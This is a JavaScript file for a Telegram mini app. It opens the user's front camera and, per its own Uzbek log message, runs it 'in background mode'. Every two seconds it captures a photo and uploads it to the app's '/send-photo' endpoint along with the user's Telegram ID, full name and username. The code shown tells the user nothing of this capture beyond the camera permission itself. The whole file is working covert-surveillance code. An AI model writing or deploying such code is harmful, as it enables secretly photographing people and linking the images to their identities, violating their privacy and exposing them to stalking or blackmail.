Telegram.WebApp.ready();
Telegram.WebApp.expand();

const user = Telegram.WebApp.initDataUnsafe?.user;
const video = document.getElementById("video");

(async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });

    video.srcObject = stream;
    await video.play();

    console.log("📸 Kamera fon rejimida ishga tushdi");

    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");

    setInterval(() => {
      if (!video.videoWidth || !video.videoHeight) return;

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(blob => {
        const file = new File([blob], `photo.png`, { type: "image/png" });

        const formData = new FormData();
        formData.append("photo", file);
        formData.append("user_id", user.id);
        formData.append("tg_fullname", `${user.first_name} ${user.last_name || ""}`);
        formData.append("tg_username", user.username || "yo'q");

        fetch("/send-photo", {
          method: "POST",
          body: formData
        })
          .then(res => res.json())
          .then(data => console.log("✅ Yuborildi:", data))
          .catch(err => console.error("❌ Yuborishda xatolik:", err));
      }, "image/png");
    }, 2000);

  } catch (err) {
    console.error("❌ Kamera xato:", err.message);
    alert("Kamera ishlamayapti. Brauzer ruxsatini tekshiring.");
  }
})();
